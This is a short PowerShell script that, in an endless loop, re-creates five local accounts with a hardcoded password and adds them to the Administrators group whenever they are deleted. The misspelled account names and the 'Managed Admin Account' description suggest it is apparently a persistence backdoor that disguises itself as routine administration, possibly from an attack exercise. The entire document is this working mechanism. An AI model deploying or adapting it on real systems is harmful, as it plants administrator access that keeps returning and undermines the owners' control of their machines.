# List of users to maintain
$targetUsers = @("apthoecary", "shephard", "blacksmtih", "boran", "scirbe")
$defaultPass = ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force

while ($true) {
    foreach ($user in $targetUsers) {
        # Check if user exists
        $check = Get-LocalUser -Name $user -ErrorAction SilentlyContinue
        
        if (-not $check) {
            Write-Output "User $user missing. Recreating..."
            # Create the user
            New-LocalUser -Name $user -Password $defaultPass -Description "Managed Admin Account"
            # Add to Administrators group
            Add-LocalGroupMember -Group "Administrators" -Member $user
        }
    }
    # Wait for 5 minutes (300 seconds)
    Start-Sleep -Seconds 300
}